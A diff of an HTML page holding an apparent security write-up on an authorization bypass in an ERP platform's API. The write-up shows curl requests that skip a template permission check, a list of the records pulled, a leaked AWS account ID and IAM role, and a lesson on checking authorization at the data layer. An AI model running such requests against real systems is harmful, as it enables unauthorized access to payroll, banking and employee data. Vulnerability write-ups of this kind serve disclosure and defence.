@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>The API Said "Or" and I Chose the Unguarded Door: 9,453 Records from Zero Privileges — r1gor</title>
+  <title>Two Doors, One Room, 9453 Records — r1gor</title>
   <link rel="stylesheet" href="../style.css">
 </head>
 <body>
@@ -21,21 +21,22 @@
 <hr class="section-rule">
 <a href="../" class="back">all write-ups</a>
 <article>
-<h1>The API Said "Or" and I Chose the Unguarded Door: 9,453 Records from Zero Privileges</h1>
-<p>Target: an ERP platform for enterprise resource planning. Manages employees, payroll, bank accounts, vendors, the works.</p>
+<h1>Two Doors, One Room, 9453 Records</h1>
+<p>Target is an ERP platform. Manages employees, payroll, bank accounts,
+vendors, the works.</p>
 <p>The main data access endpoint accepts two input formats:</p>
 <pre><code>{&quot;templateName&quot;: &quot;main&quot;}           -- loads a predefined template
 {&quot;uimodel&quot;: {&quot;nodes&quot;: {...}}}      -- provides the query definition inline
 </code></pre>
 <p>The auth check only existed on the first path.</p>
-<h2>The bypass</h2>
-<p>Template request - blocked:</p>
+<h2>the bypass</h2>
+<p>Template request, blocked:</p>
 <pre><code class="language-bash">curl -X POST &quot;[TARGET]/api/app/uiengine/uimodel&quot; \
   -H &quot;Authorization: Bearer $JWT&quot; \
   -d '{&quot;templateName&quot;:&quot;main&quot;}'
 # AUTHORIZATION_ERROR: Execution of template denied
 </code></pre>
-<p>Direct uimodel request - wide open:</p>
+<p>Direct uimodel request, wide open:</p>
 <pre><code class="language-bash">curl -X POST &quot;[TARGET]/api/app/uiengine/uimodel&quot; \
   -H &quot;Authorization: Bearer $JWT&quot; \
   -d '{&quot;uimodel&quot;:{&quot;nodes&quot;:{&quot;root&quot;:{
@@ -43,12 +44,18 @@
     &quot;type&quot;:&quot;list&quot;,&quot;query&quot;:{&quot;where&quot;:{}}}}}}'
 # Returns: 6,929 permission policies, 6.1MB
 </code></pre>
-<p>The API error message itself documented the bypass: "You need at least a templateName <strong>or</strong> a uimodel definition." The <code>checkTemplatePermission()</code> function only fires when <code>templateName</code> is present. The uimodel path goes straight to the data layer.</p>
-<h2>What came out</h2>
-<p>My test account had zero team assignment, zero project access. Here is what I pulled:</p>
+<p>The API error message itself documented the bypass. It said "You need at
+least a templateName <strong>or</strong> a uimodel definition." The
+<code>checkTemplatePermission()</code> function only fires when <code>templateName</code> is
+present. The uimodel path goes straight to the data layer.</p>
+<h2>what came out</h2>
+<p>My test account had zero team assignment, zero project access.
+Here is what I pulled:</p>
 <ul>
-<li>6,929 permission policies (the entire authorization ruleset, 3,081 unique policy names)</li>
-<li>988 internal developer documents (Row Level Security architecture, permission engine design, authorization guides, all downloadable)</li>
+<li>6,929 permission policies (the entire authorization ruleset,
+  3,081 unique policy names)</li>
+<li>988 internal developer documents (Row Level Security architecture,
+  permission engine design, authorization guides, all downloadable)</li>
 <li>436 application template registry records</li>
 <li>6 employees with names, locations, employee numbers</li>
 <li>Salary records: hourly rate $40, monthly $6,933</li>
@@ -59,18 +66,25 @@
 <li>Plaid banking API configs</li>
 </ul>
 <p>26 models. 9,453 records total.</p>
-<h2>Write access too</h2>
-<p>I tested mutations. The auth layer approved all of them. They only failed on downstream validators.</p>
+<h2>write access too</h2>
+<p>I tested mutations. The auth layer approved all of them. They only
+failed on downstream validators.</p>
 <p>Secret delete attempt leaked AWS infrastructure:</p>
 <pre><code>AWS Account ID:  293073257408
 Tenant ID:       415bf6ab-...
 IAM Role:        arn:aws:sts::293073257408:assumed-role/tenant-.../token-file-web-identity
 </code></pre>
-<p>The application said "go ahead." Only the AWS IAM policy on Secrets Manager stopped actual deletion.</p>
-<p>Feature toggle create: failed on "required fields missing," not on authorization.
-Policy update: failed on "where clause must not be empty," not on authorization.</p>
-<h2>The lesson</h2>
-<p>Two doors to the same room. One locked, one not. The auth check sat at the entry point (template resolution) instead of the data layer (model query). Any time there are multiple paths to the same data, authorization needs to live where the data is accessed, not where the request enters.</p>
+<p>The application said go ahead. Only the AWS IAM policy on Secrets
+Manager stopped actual deletion.</p>
+<p>Feature toggle create: failed on "required fields missing", not
+on authorization. Policy update: failed on "where clause must not
+be empty", not on authorization.</p>
+<h2>the lesson</h2>
+<p>Two doors to the same room. One locked, one not. The auth check
+sat at the entry point (template resolution) instead of the data
+layer (model query). Any time there are multiple paths to the same
+data, authorization needs to live where the data is accessed, not
+where the request enters.</p>
 </article>
 </main>
 <footer>
